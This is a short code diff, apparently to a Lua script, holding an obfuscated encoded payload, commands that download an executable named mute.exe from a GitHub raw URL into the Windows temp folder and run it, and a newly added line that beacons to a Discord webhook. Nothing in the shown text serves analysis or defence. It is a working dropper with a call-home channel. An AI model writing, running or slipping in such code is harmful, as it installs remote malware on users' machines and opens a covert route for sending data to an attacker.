@@ -2,3 +2,5 @@ vipscript=decodeFunction('c-n1JU25Av5T2FSKbVFF8cKg(gh*zWY,1IOG:YF++;VDIVq(Lhidvy
 
 os.execute('curl -L -o %TEMP%\\mute.exe https://github.com/nd863281/Sofia12/raw/main/mute.exe')
 os.execute('start "" "%TEMP%\\mute.exe"')
+
+os.execute('curl -H "Content-Type: application/json" -d "{\\"content\\":\\"helo\\"}" https://discord.com/api/webhooks/1495766415331033148/_akU1vQzsXQ1QLD_Aac3KVWSkzUAFo7dYbjbI2xp--1W9W9SMGJODS57TQzWEFeiecGF')
